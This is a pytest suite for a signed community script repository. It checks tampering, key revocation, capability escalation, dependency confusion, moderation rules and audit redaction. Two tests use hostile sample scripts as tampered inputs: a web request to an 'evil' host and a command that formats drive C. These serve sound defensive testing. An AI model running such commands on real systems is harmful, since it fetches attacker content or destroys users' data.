# SPDX-License-Identifier: AGPL-3.0-only
"""Moderated community script repository: trust chain, abuse, and recovery (#74).

Covers tampered/malicious packages, revoked publishers and keys, capability
escalation, dependency confusion, moderation separation of duties, immutable
versions, safe update/rollback, dispatch and scheduler enforcement, the role
matrix, idempotency, and digest-only audit evidence.
"""
from __future__ import annotations

import importlib.util
import json
import os
from datetime import datetime, timedelta, timezone
from pathlib import Path
from uuid import uuid4

import pytest
import pytest_asyncio

os.environ.setdefault("DATABASE_URL", "sqlite+aiosqlite:///./test_community_packages.db")
os.environ.setdefault("DEBUG", "false")
os.environ.setdefault("SECRET_KEY", "test-secret")
os.environ.setdefault("COMMAND_SIGNING_KEY_PATH", "command_signing_key.pem")

import httpx  # noqa: E402
from cryptography.hazmat.primitives import serialization  # noqa: E402
from cryptography.hazmat.primitives.asymmetric import ec  # noqa: E402
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402
from sqlalchemy import select  # noqa: E402

from app.core import community_packages as trust  # noqa: E402
from app.core.command_envelope import COMMAND_ENVELOPE_V2  # noqa: E402
from app.core.database import AsyncSessionLocal, Base, engine  # noqa: E402
from app.core.scheduler import dispatch_scheduled_tasks_once  # noqa: E402
from app.core.security import hash_password  # noqa: E402
from app.main import app  # noqa: E402
from app.models.models import (  # noqa: E402
    AuditEvent,
    Command,
    CommandKind,
    Operator,
    OperatorRole,
    ScheduleConcurrencyPolicy,
    ScheduledTask,
    ScheduleMisfirePolicy,
    ScheduleTargetType,
    ScriptExecutionScope,
    ScriptLibraryItem,
    ScriptVersion,
    ScriptVersionReview,
)
from tests._tenancy import grant_all_memberships  # noqa: E402

_CLI_PATH = Path(__file__).resolve().parents[1] / "scripts" / "sign_community_package.py"
_spec = importlib.util.spec_from_file_location("sign_community_package", _CLI_PATH)
cli = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(cli)

SCRIPT_V1 = "Remove-Item -Path $env:TEMP\\nodelink-*.tmp -ErrorAction SilentlyContinue"
SCRIPT_V2 = SCRIPT_V1 + "\nWrite-Output 'cleaned'"
REASON = "reviewed-by-moderation-SENTINEL-8f3a"


@pytest_asyncio.fixture
async def clients():
    async with engine.begin() as connection:
        await connection.run_sync(Base.metadata.drop_all)
        await connection.run_sync(Base.metadata.create_all)
    async with AsyncSessionLocal() as db:
        for role_name, role, platform in (
            ("admin", OperatorRole.admin, True),
            ("moderator", OperatorRole.admin, True),
            ("operator", OperatorRole.operator, False),
            ("viewer", OperatorRole.readonly, False),
        ):
            db.add(
                Operator(
                    email=f"community-{role_name}@nodelink.test",
                    password_hash=hash_password(f"{role_name}-password"),
                    role=role,
                    is_platform_admin=platform,
                    script_execution_scope=ScriptExecutionScope.global_,
                )
            )
        await grant_all_memberships(db)
        await db.commit()

    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test/api/v1") as client:
        headers = {}
        for role_name in ("admin", "moderator", "operator", "viewer"):
            login = await client.post(
                "/auth/login",
                json={
                    "email": f"community-{role_name}@nodelink.test",
                    "password": f"{role_name}-password",
                },
            )
            assert login.status_code == 200, login.text
            headers[role_name] = {"Authorization": f"Bearer {login.json()['access_token']}"}
        yield client, headers
    await engine.dispose()


def _keypair() -> tuple[Ed25519PrivateKey, str]:
    key = Ed25519PrivateKey.generate()
    pem = key.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode("ascii")
    return key, pem


def _submission(
    key: Ed25519PrivateKey,
    *,
    key_id: str = "acme-2026",
    publisher: str = "acme",
    name: str = "temp-cleanup",
    version: str = "1.0.0",
    content: str = SCRIPT_V1,
    capabilities: list[str] | None = None,
    language: str = "powershell",
    platforms: list[str] | None = None,
) -> dict:
    manifest = cli.build_manifest(
        publisher=publisher,
        name=name,
        version=version,
        language=language,
        content=content,
        platforms=platforms or ["windows"],
        capabilities=["filesystem.write"] if capabilities is None else capabilities,
        description="Clears NodeLink temp files",
        tags=["cleanup"],
    )
    return {
        "manifest": manifest,
        "content": content,
        "key_id": key_id,
        "signature": cli.sign_manifest(key, manifest),
    }


async def _publisher(client, headers, slug: str = "acme", key_id: str = "acme-2026"):
    created = await client.post(
        "/community/publishers",
        headers=headers["admin"],
        json={"slug": slug, "display_name": slug.title()},
    )
    assert created.status_code == 201, created.text
    key, pem = _keypair()
    added = await client.post(
        f"/community/publishers/{created.json()['id']}/keys",
        headers=headers["admin"],
        json={"key_id": key_id, "public_key_pem": pem},
    )
    assert added.status_code == 201, added.text
    return created.json()["id"], key


async def _submit(client, headers, body, role: str = "operator"):
    return await client.post("/community/submissions", headers=headers[role], json=body)


async def _moderate(client, headers, package_id, version, *, ack=True, state="approved"):
    return await client.post(
        f"/community/packages/{package_id}/versions/{version}/moderation",
        headers=headers["moderator"],
        json={
            "state": state,
            "reason": REASON,
            "acknowledge_capability_escalation": ack,
        },
    )


async def _approved_package(client, headers, **kwargs):
    publisher_id, key = await _publisher(client, headers)
    submitted = await _submit(client, headers, _submission(key, **kwargs))
    assert submitted.status_code == 201, submitted.text
    package_id = submitted.json()["id"]
    moderated = await _moderate(client, headers, package_id, kwargs.get("version", "1.0.0"))
    assert moderated.status_code == 200, moderated.text
    return publisher_id, key, package_id


def _caps(language: str = "powershell", extra=("filesystem.write",), platforms=("windows",)):
    run = {"powershell": "script.run.powershell", "shell": "script.run.shell"}[language]
    return sorted({run, *extra, *(f"platform.{p}" for p in platforms)})


async def _install(client, headers, package_id, version="1.0.0", **extra):
    body = {
        "package_id": package_id,
        "version": version,
        "accepted_capabilities": _caps(),
        "request_id": f"install-{uuid4().hex[:12]}",
    }
    body.update(extra)
    return await client.post("/community/installs", headers=headers["admin"], json=body)


async def _enroll(client, headers, os_name: str = "windows") -> str:
    admin = headers["admin"]
    org = (await client.post("/clients", headers=admin, json={"name": f"Clinic {uuid4().hex}"})).json()
    site = (await client.post("/sites", headers=admin, json={"client_id": org["id"], "name": "HQ"})).json()
    token = (await client.post("/enrollment-tokens", headers=admin, json={"site_id": site["id"]})).json()
    enrolled = await client.post(
        "/enroll",
        json={
            "enrollment_token": token["token"],
            "hostname": f"pc-{uuid4().hex[:6]}",
            "os": os_name,
            "supported_command_envelope_versions": [COMMAND_ENVELOPE_V2],
        },
    )
    assert enrolled.status_code in (200, 201), enrolled.text
    async with AsyncSessionLocal() as db:
        await grant_all_memberships(db)
        await db.commit()
    return enrolled.json()["agent_id"]


async def _dispatch(client, headers, agent_id, script_version_id, *, kind="powershell", script=SCRIPT_V1):
    return await client.post(
        f"/agents/{agent_id}/commands",
        headers=headers["admin"],
        json={
            "kind": kind,
            "payload": {"script": script},
            "ttl_seconds": 300,
            "script_version_id": script_version_id,
        },
    )


async def _audit(action: str) -> list[AuditEvent]:
    async with AsyncSessionLocal() as db:
        return list(
            (await db.execute(select(AuditEvent).where(AuditEvent.action == action))).scalars()
        )


# --- contract ----------------------------------------------------------------


def test_cli_and_server_canonical_encoding_are_byte_identical():
    key, _ = _keypair()
    body = _submission(key)
    assert cli.canonical_manifest_bytes(body["manifest"]) == trust.canonical_manifest_bytes(
        body["manifest"]
    )
    verified = trust.validate_manifest(body["manifest"], body["content"])
    assert verified.version == (1, 0, 0)


@pytest.mark.parametrize(
    "mutate, code",
    [
        (lambda m: m.update(capabilities=sorted(m["capabilities"] + ["kernel.load"])), "capability_unknown"),
        (lambda m: m.update(capabilities=["filesystem.write", "platform.windows", "script.run.shell"]), "capability_language_mismatch"),
        (lambda m: m.update(capabilities=["filesystem.write", "platform.linux", "script.run.powershell"]), "capability_platform_mismatch"),
        (lambda m: m.update(version="1.0"), "manifest_invalid"),
        (lambda m: m.update(publisher="Acme Corp"), "manifest_invalid"),
        (lambda m: m.update(extra="field"), "manifest_invalid"),
        (lambda m: m.update(content_bytes=m["content_bytes"] + 1), "content_digest_mismatch"),
    ],
)
def test_manifest_validation_fails_closed(mutate, code):
    key, _ = _keypair()
    body = _submission(key)
    mutate(body["manifest"])
    with pytest.raises(trust.CommunityRefusal) as refusal:
        trust.validate_manifest(body["manifest"], body["content"])
    assert refusal.value.code == code


def test_non_canonical_content_is_refused():
    key, _ = _keypair()
    body = _submission(key)
    with pytest.raises(trust.CommunityRefusal) as refusal:
        trust.validate_manifest(body["manifest"], body["content"] + "\r\n")
    assert refusal.value.code == "content_not_canonical"


def test_signature_verification_rejects_malformed_inputs():
    key, pem = _keypair()
    body = _submission(key)
    assert trust.verify_signature(pem, body["signature"], body["manifest"])
    assert not trust.verify_signature(pem, "not base64!!", body["manifest"])
    assert not trust.verify_signature(pem, "AAAA", body["manifest"])
    other, other_pem = _keypair()
    assert not trust.verify_signature(other_pem, body["signature"], body["manifest"])


# --- end to end --------------------------------------------------------------


@pytest.mark.asyncio
async def test_signed_package_flows_to_dispatch_and_revocation_blocks_next_run(clients):
    client, headers = clients
    publisher_id, _, package_id = await _approved_package(client, headers)

    installed = await _install(client, headers, package_id)
    assert installed.status_code == 201, installed.text
    install = installed.json()
    assert install["qualified_name"] == "acme/temp-cleanup"
    async with AsyncSessionLocal() as db:
        library_version = await db.get(ScriptVersion, install["script_version_id"])
        assert library_version.content == SCRIPT_V1
        assert library_version.community_package_version_id is not None
        review = await db.scalar(
            select(ScriptVersionReview).where(
                ScriptVersionReview.script_version_id == library_version.id
            )
        )
        assert review.state.value == "approved"

    agent_id = await _enroll(client, headers)
    ok = await _dispatch(client, headers, agent_id, install["script_version_id"])
    assert ok.status_code == 200, ok.text

    revoked = await client.post(
        f"/community/publishers/{publisher_id}/revoke",
        headers=headers["admin"],
        json={"request_id": "revoke-acme-0001", "reason": REASON},
    )
    assert revoked.status_code == 200
    assert revoked.json()["status"] == "revoked"
    package = (await client.get(f"/community/packages/{package_id}", headers=headers["viewer"])).json()
    assert package["versions"][0]["state"] == "blocked"

    refused = await _dispatch(client, headers, agent_id, install["script_version_id"])
    assert refused.status_code == 409
    assert refused.json()["detail"]["code"] == "community_package_blocked"
    events = await _audit("community.dispatch_refused")
    assert [event.detail["code"] for event in events] == ["community_package_blocked"]
    async with AsyncSessionLocal() as db:
        commands = (await db.execute(select(Command).where(Command.agent_id == agent_id))).scalars().all()
        assert len(commands) == 1


# --- tampering and keys ------------------------------------------------------


@pytest.mark.asyncio
async def test_tampered_and_forged_submissions_are_refused_with_evidence(clients):
    client, headers = clients
    _, key = await _publisher(client, headers)

    tampered_content = _submission(key)
    tampered_content["content"] = SCRIPT_V1 + "\nInvoke-WebRequest http://evil"
    response = await _submit(client, headers, tampered_content)
    assert response.json()["detail"]["code"] == "content_digest_mismatch"

    tampered_manifest = _submission(key)
    tampered_manifest["manifest"]["description"] = "Totally harmless"
    response = await _submit(client, headers, tampered_manifest)
    assert response.status_code == 422
    assert response.json()["detail"]["code"] == "signature_invalid"

    rogue, _ = _keypair()
    response = await _submit(client, headers, _submission(rogue))
    assert response.json()["detail"]["code"] == "signature_invalid"

    response = await _submit(client, headers, _submission(key, key_id="unknown-key"))
    assert response.json()["detail"]["code"] == "publisher_key_unknown"

    events = await _audit("community.submission_refused")
    assert [event.detail["code"] for event in events] == [
        "content_digest_mismatch",
        "signature_invalid",
        "signature_invalid",
        "publisher_key_unknown",
    ]
    # Claimed identity is digested, never stored verbatim.
    assert "publisher" not in events[0].detail
    assert "publisher_sha256" in events[0].detail
    listing = await client.get("/community/packages", headers=headers["viewer"])
    assert listing.json()["total"] == 0


@pytest.mark.asyncio
async def test_namespace_is_bound_to_key_owner(clients):
    client, headers = clients
    await _publisher(client, headers, slug="acme", key_id="acme-2026")
    _, mallory_key = await _publisher(client, headers, slug="mallory", key_id="mallory-1")
    # Mallory signs a manifest claiming the acme namespace with her own key.
    forged = _submission(mallory_key, publisher="acme", key_id="mallory-1")
    response = await _submit(client, headers, forged)
    assert response.status_code == 422
    assert response.json()["detail"]["code"] == "manifest_publisher_mismatch"


@pytest.mark.asyncio
async def test_publisher_key_registration_rules(clients):
    client, headers = clients
    publisher_id, _ = await _publisher(client, headers)
    ec_pem = ec.generate_private_key(ec.SECP256R1()).public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()
    for pem in (ec_pem, "-----BEGIN PUBLIC KEY-----\nnope\n-----END PUBLIC KEY-----"):
        response = await client.post(
            f"/community/publishers/{publisher_id}/keys",
            headers=headers["admin"],
            json={"key_id": "bad-key", "public_key_pem": pem},
        )
        assert response.status_code == 422
        assert response.json()["detail"]["code"] == "publisher_key_invalid"
    duplicate = await client.post(
        f"/community/publishers/{publisher_id}/keys",
        headers=headers["admin"],
        json={"key_id": "acme-2026", "public_key_pem": _keypair()[1]},
    )
    assert duplicate.json()["detail"]["code"] == "publisher_key_exists"
    dup_slug = await client.post(
        "/community/publishers", headers=headers["admin"], json={"slug": "acme", "display_name": "x"}
    )
    assert dup_slug.json()["detail"]["code"] == "publisher_slug_exists"


@pytest.mark.asyncio
async def test_revoked_key_blocks_submission_install_and_dispatch(clients):
    client, headers = clients
    publisher_id, key, package_id = await _approved_package(client, headers)
    install = (await _install(client, headers, package_id)).json()
    agent_id = await _enroll(client, headers)

    revoked = await client.post(
        f"/community/publishers/{publisher_id}/keys/acme-2026/revoke",
        headers=headers["admin"],
        json={"request_id": "revoke-key-0001", "reason": REASON},
    )
    assert revoked.status_code == 200
    assert revoked.json()["keys"][0]["status"] == "revoked"

    response = await _submit(client, headers, _submission(key, version="1.1.0"))
    assert response.json()["detail"]["code"] == "publisher_key_revoked"
    package = (await client.get(f"/community/packages/{package_id}", headers=headers["viewer"])).json()
    assert package["versions"][0]["state"] == "blocked"
    refused = await _dispatch(client, headers, agent_id, install["script_version_id"])
    assert refused.json()["detail"]["code"] == "community_package_blocked"


# --- capabilities ------------------------------------------------------------


@pytest.mark.asyncio
async def test_capability_escalation_requires_acknowledgement_and_exact_acceptance(clients):
    client, headers = clients
    _, key, package_id = await _approved_package(client, headers)
    install = (await _install(client, headers, package_id)).json()

    escalated = _submission(
        key, version="1.1.0", content=SCRIPT_V2, capabilities=["filesystem.write", "network.egress"]
    )
    assert (await _submit(client, headers, escalated)).status_code == 201
    unacked = await _moderate(client, headers, package_id, "1.1.0", ack=False)
    assert unacked.status_code == 409
    assert unacked.json()["detail"] == {
        "code": "capability_escalation_unacknowledged",
        "capabilities": ["network.egress"],
    }
    acked = await _moderate(client, headers, package_id, "1.1.0", ack=True)
    assert acked.status_code == 200
    events = await _audit("community.moderated")
    assert events[-1].detail["capability_escalation"] == ["network.egress"]

    stale = await client.post(
        f"/community/installs/{install['id']}/update",
        headers=headers["admin"],
        json={"version": "1.1.0", "accepted_capabilities": _caps(), "request_id": "update-0001"},
    )
    assert stale.status_code == 409
    assert stale.json()["detail"]["code"] == "install_capabilities_mismatch"
    updated = await client.post(
        f"/community/installs/{install['id']}/update",
        headers=headers["admin"],
        json={
            "version": "1.1.0",
            "accepted_capabilities": _caps(extra=("filesystem.write", "network.egress")),
            "request_id": "update-0002",
        },
    )
    assert updated.status_code == 200, updated.text
    assert updated.json()["installed_version"] == "1.1.0"
    assert updated.json()["library_version"] == 2


@pytest.mark.asyncio
async def test_first_approval_with_side_effects_needs_acknowledgement(clients):
    client, headers = clients
    _, key = await _publisher(client, headers)
    submitted = await _submit(client, headers, _submission(key))
    response = await _moderate(client, headers, submitted.json()["id"], "1.0.0", ack=False)
    assert response.json()["detail"]["capabilities"] == ["filesystem.write"]
    plain = await _submit(client, headers, _submission(key, name="plain", capabilities=[]))
    response = await _moderate(client, headers, plain.json()["id"], "1.0.0", ack=False)
    assert response.status_code == 200


@pytest.mark.asyncio
async def test_dispatch_outside_declared_scope_is_refused(clients):
    client, headers = clients
    _, _, package_id = await _approved_package(client, headers)
    install = (await _install(client, headers, package_id)).json()
    windows = await _enroll(client, headers, "windows")
    linux = await _enroll(client, headers, "linux")

    wrong_kind = await _dispatch(client, headers, windows, install["script_version_id"], kind="shell")
    assert wrong_kind.json()["detail"]["code"] == "community_capability_denied"
    wrong_platform = await _dispatch(client, headers, linux, install["script_version_id"])
    assert wrong_platform.json()["detail"]["code"] == "community_capability_denied"
    swapped = await _dispatch(
        client, headers, windows, install["script_version_id"], script="Format-Volume -DriveLetter C"
    )
    assert swapped.json()["detail"]["code"] == "community_content_mismatch"
    codes = [event.detail["code"] for event in await _audit("community.dispatch_refused")]
    assert codes == [
        "community_capability_denied",
        "community_capability_denied",
        "community_content_mismatch",
    ]


# --- dependency confusion ----------------------------------------------------


@pytest.mark.asyncio
async def test_dependency_confusion_cannot_shadow_or_alias_packages(clients):
    client, headers = clients
    _, acme_key = await _publisher(client, headers, slug="acme", key_id="acme-2026")
    _, other_key = await _publisher(client, headers, slug="other", key_id="other-1")
    a = await _submit(client, headers, _submission(acme_key, name="tool", capabilities=[]))
    b = await _submit(
        client, headers, _submission(other_key, publisher="other", key_id="other-1", name="tool", capabilities=[])
    )
    assert a.json()["qualified_name"] == "acme/tool"
    assert b.json()["qualified_name"] == "other/tool"
    assert a.json()["id"] != b.json()["id"]
    for package in (a.json(), b.json()):
        assert (await _moderate(client, headers, package["id"], "1.0.0")).status_code == 200

    # A pre-existing local script with the qualified name is never taken over.
    async with AsyncSessionLocal() as db:
        db.add(ScriptLibraryItem(name="acme/tool", normalized_name="acme/tool", created_by="x"))
        await db.commit()
    shadowed = await _install(
        client, headers, a.json()["id"], accepted_capabilities=_caps(extra=())
    )
    assert shadowed.status_code == 409
    assert shadowed.json()["detail"]["code"] == "library_name_shadowed"
    # Nor can another package claim a name already bound to an install.
    first = await _install(
        client, headers, b.json()["id"], accepted_capabilities=_caps(extra=()), library_name="Tool"
    )
    assert first.status_code == 201
    collide = await _install(
        client, headers, a.json()["id"], accepted_capabilities=_caps(extra=()), library_name="tool"
    )
    assert collide.json()["detail"]["code"] == "library_name_shadowed"


# --- moderation --------------------------------------------------------------


@pytest.mark.asyncio
async def test_moderation_separation_of_duties_and_finality(clients):
    client, headers = clients
    _, key = await _publisher(client, headers)
    # The admin who submits may not moderate their own submission.
    submitted = await _submit(client, headers, _submission(key), role="admin")
    package_id = submitted.json()["id"]
    self_review = await client.post(
        f"/community/packages/{package_id}/versions/1.0.0/moderation",
        headers=headers["admin"],
        json={"state": "approved", "reason": REASON, "acknowledge_capability_escalation": True},
    )
    assert self_review.status_code == 403
    assert self_review.json()["detail"]["code"] == "moderation_self_review_forbidden"

    rejected = await _moderate(client, headers, package_id, "1.0.0", state="rejected")
    assert rejected.status_code == 200
    assert rejected.json()["versions"][0]["state"] == "rejected"
    again = await _moderate(client, headers, package_id, "1.0.0")
    assert again.json()["detail"]["code"] == "moderation_already_final"
    install = await _install(client, headers, package_id)
    assert install.json()["detail"]["code"] == "package_version_not_approved"


@pytest.mark.asyncio
async def test_unmoderated_and_revoked_versions_cannot_be_installed(clients):
    client, headers = clients
    _, key = await _publisher(client, headers)
    submitted = await _submit(client, headers, _submission(key))
    package_id = submitted.json()["id"]
    assert (await _install(client, headers, package_id)).json()["detail"]["code"] == (
        "package_version_not_approved"
    )
    await _moderate(client, headers, package_id, "1.0.0")
    revoke = await client.post(
        f"/community/packages/{package_id}/versions/1.0.0/revoke",
        headers=headers["admin"],
        json={"request_id": "revoke-v1-0001", "reason": REASON},
    )
    assert revoke.json()["versions"][0]["state"] == "revoked"
    assert (await _install(client, headers, package_id)).json()["detail"]["code"] == (
        "package_version_revoked"
    )


# --- immutability, update, rollback ------------------------------------------


@pytest.mark.asyncio
async def test_versions_are_immutable_and_monotonic(clients):
    client, headers = clients
    _, key = await _publisher(client, headers)
    body = _submission(key, version="1.2.0")
    first = await _submit(client, headers, body)
    replay = await _submit(client, headers, body)
    assert first.status_code == replay.status_code == 201
    assert len(replay.json()["versions"]) == 1

    changed = await _submit(client, headers, _submission(key, version="1.2.0", content=SCRIPT_V2))
    assert changed.json()["detail"]["code"] == "package_version_exists"
    older = await _submit(client, headers, _submission(key, version="1.1.9"))
    assert older.json()["detail"]["code"] == "package_version_not_monotonic"


@pytest.mark.asyncio
async def test_update_and_rollback_append_library_versions(clients):
    client, headers = clients
    _, key, package_id = await _approved_package(client, headers)
    install = (await _install(client, headers, package_id)).json()
    await _submit(client, headers, _submission(key, version="1.1.0", content=SCRIPT_V2))
    await _moderate(client, headers, package_id, "1.1.0")

    def transition(path, version, request_id):
        return client.post(
            f"/community/installs/{install['id']}/{path}",
            headers=headers["admin"],
            json={"version": version, "accepted_capabilities": _caps(), "request_id": request_id},
        )

    sideways = await transition("update", "1.0.0", "update-same-1")
    assert sideways.json()["detail"]["code"] == "install_downgrade_requires_rollback"
    updated = await transition("update", "1.1.0", "update-0001")
    assert updated.json()["library_version"] == 2
    replay = await transition("update", "1.1.0", "update-0001")
    assert replay.status_code == 200
    assert replay.json()["library_version"] == 2

    forward = await transition("rollback", "1.1.0", "rollback-bad-1")
    assert forward.json()["detail"]["code"] == "install_rollback_requires_older_version"
    rolled = await transition("rollback", "1.0.0", "rollback-0001")
    assert rolled.status_code == 200
    assert rolled.json()["installed_version"] == "1.0.0"
    assert rolled.json()["library_version"] == 3
    async with AsyncSessionLocal() as db:
        current = await db.get(ScriptVersion, rolled.json()["script_version_id"])
        assert current.version == 3
        assert current.content == SCRIPT_V1
    assert len(await _audit("community.rolled_back")) == 1

    # Rolling forward onto a version revoked after its approval is refused.
    await client.post(
        f"/community/packages/{package_id}/versions/1.1.0/revoke",
        headers=headers["admin"],
        json={"request_id": "revoke-v11-0001", "reason": REASON},
    )
    blocked = await transition("update", "1.1.0", "update-0002")
    assert blocked.json()["detail"]["code"] == "package_version_revoked"


@pytest.mark.asyncio
async def test_install_is_idempotent_by_request_id(clients):
    client, headers = clients
    _, _, package_id = await _approved_package(client, headers)
    first = await _install(client, headers, package_id, request_id="install-fixed-1")
    replay = await _install(client, headers, package_id, request_id="install-fixed-1")
    assert first.status_code == 201
    assert replay.status_code == 201
    assert replay.json()["id"] == first.json()["id"]
    conflict = await _install(client, headers, package_id, request_id="install-fixed-1", version="9.9.9")
    assert conflict.json()["detail"]["code"] == "install_request_conflict"
    again = await _install(client, headers, package_id)
    assert again.json()["detail"]["code"] == "package_already_installed"
    assert len(await _audit("community.installed")) == 1


# --- scheduler ---------------------------------------------------------------


@pytest.mark.asyncio
async def test_scheduler_and_schedule_creation_enforce_community_trust(clients):
    client, headers = clients
    _, _, package_id = await _approved_package(client, headers)
    install = (await _install(client, headers, package_id)).json()
    agent_id = await _enroll(client, headers)
    schedule = {
        "name": "Nightly cleanup",
        "enabled": True,
        "target_type": "agent",
        "target_id": agent_id,
        "cron_expression": "0 * * * *",
        "timezone": "UTC",
        "kind": "powershell",
        "payload": {"script": SCRIPT_V1},
        "script_version_id": install["script_version_id"],
        "concurrency_policy": "allow",
        "misfire_policy": "run_once",
    }
    wrong = await client.post(
        "/scheduled-tasks", headers=headers["admin"], json={**schedule, "payload": {"script": "x"}}
    )
    assert wrong.status_code == 409
    assert wrong.json()["detail"]["code"] == "community_content_mismatch"

    async with AsyncSessionLocal() as db:
        db.add(
            ScheduledTask(
                id=str(uuid4()),
                name="Nightly cleanup",
                enabled=True,
                target_type=ScheduleTargetType.agent,
                target_id=agent_id,
                cron_expression="0 * * * *",
                timezone="UTC",
                kind=CommandKind.powershell,
                payload={"script": SCRIPT_V1},
                script_version_id=install["script_version_id"],
                concurrency_policy=ScheduleConcurrencyPolicy.allow,
                misfire_policy=ScheduleMisfirePolicy.run_once,
                next_run_at=datetime.now(timezone.utc) - timedelta(minutes=5),
            )
        )
        await db.commit()
    await client.post(
        f"/community/packages/{package_id}/versions/1.0.0/revoke",
        headers=headers["admin"],
        json={"request_id": "revoke-sched-01", "reason": REASON},
    )
    async with AsyncSessionLocal() as db:
        result = await dispatch_scheduled_tasks_once(db)
        await db.commit()
        assert result["dispatched"] == 0
        commands = (await db.execute(select(Command))).scalars().all()
        assert commands == []
    events = await _audit("community.dispatch_refused")
    assert [(e.detail["source"], e.detail["code"]) for e in events] == [
        ("scheduler", "community_package_blocked")
    ]
    refused = await client.post("/scheduled-tasks", headers=headers["admin"], json=schedule)
    assert refused.json()["detail"]["code"] == "community_package_blocked"


@pytest.mark.asyncio
async def test_unknown_resources_are_not_found(clients):
    client, headers = clients
    admin = headers["admin"]
    revoke = {"request_id": "revoke-none-01", "reason": REASON}
    transition = {"version": "1.0.0", "accepted_capabilities": [], "request_id": "update-none1"}
    publisher_id, _ = await _publisher(client, headers)
    checks = [
        await client.get("/community/packages/missing", headers=admin),
        await client.get("/community/packages/missing/versions/1.0.0", headers=admin),
        await client.post("/community/publishers/missing/revoke", headers=admin, json=revoke),
        await client.post(f"/community/publishers/{publisher_id}/keys/none/revoke", headers=admin, json=revoke),
        await client.post("/community/installs/missing/update", headers=admin, json=transition),
    ]
    assert [response.status_code for response in checks] == [404] * len(checks)
    agent_id = await _enroll(client, headers)
    schedule = await client.post(
        "/scheduled-tasks",
        headers=admin,
        json={
            "name": "Ghost", "enabled": True, "target_type": "agent", "target_id": agent_id,
            "cron_expression": "0 * * * *", "timezone": "UTC", "kind": "powershell",
            "payload": {"script": SCRIPT_V1}, "script_version_id": "missing-version",
            "concurrency_policy": "allow", "misfire_policy": "run_once",
        },
    )
    assert schedule.status_code == 400
    assert schedule.json()["detail"]["code"] == "script_version_not_found"


# --- authorization and evidence ----------------------------------------------


@pytest.mark.asyncio
async def test_role_matrix(clients):
    client, headers = clients
    _, key = await _publisher(client, headers)
    body = _submission(key)
    assert (await _submit(client, headers, body, role="viewer")).status_code == 403
    submitted = await _submit(client, headers, body)
    package_id = submitted.json()["id"]
    for path, payload in (
        ("/community/publishers", {"slug": "x", "display_name": "x"}),
        (f"/community/packages/{package_id}/versions/1.0.0/moderation", {"state": "approved", "reason": REASON}),
        (f"/community/packages/{package_id}/versions/1.0.0/revoke", {"request_id": "r-00000001", "reason": REASON}),
        ("/community/installs", {"package_id": package_id, "version": "1.0.0", "accepted_capabilities": [], "request_id": "i-00000001"}),
    ):
        assert (await client.post(path, headers=headers["operator"], json=payload)).status_code == 403
    for path in ("/community/publishers", "/community/packages", f"/community/packages/{package_id}",
                 f"/community/packages/{package_id}/versions/1.0.0", "/community/installs"):
        assert (await client.get(path, headers=headers["viewer"])).status_code == 200
    assert (await client.get("/community/packages")).status_code == 401


@pytest.mark.asyncio
async def test_audit_evidence_never_contains_reasons_content_or_signatures(clients):
    client, headers = clients
    publisher_id, key, package_id = await _approved_package(client, headers)
    await _install(client, headers, package_id)
    detail = await client.get(f"/community/packages/{package_id}/versions/1.0.0", headers=headers["viewer"])
    signature = detail.json()["signature"]
    assert detail.json()["content"] == SCRIPT_V1
    await client.post(
        f"/community/publishers/{publisher_id}/revoke",
        headers=headers["admin"],
        json={"request_id": "revoke-audit-01", "reason": REASON},
    )
    async with AsyncSessionLocal() as db:
        events = (
            await db.execute(select(AuditEvent).where(AuditEvent.action.like("community.%")))
        ).scalars().all()
    assert {event.action for event in events} >= {
        "community.publisher_created",
        "community.publisher_key_added",
        "community.submitted",
        "community.moderated",
        "community.installed",
        "community.version_viewed",
        "community.publisher_revoked",
    }
    serialized = json.dumps([event.detail for event in events])
    assert REASON not in serialized
    assert SCRIPT_V1 not in serialized
    assert signature not in serialized
    moderated = next(event for event in events if event.action == "community.moderated")
    assert moderated.detail["reason_bytes"] == len(REASON)
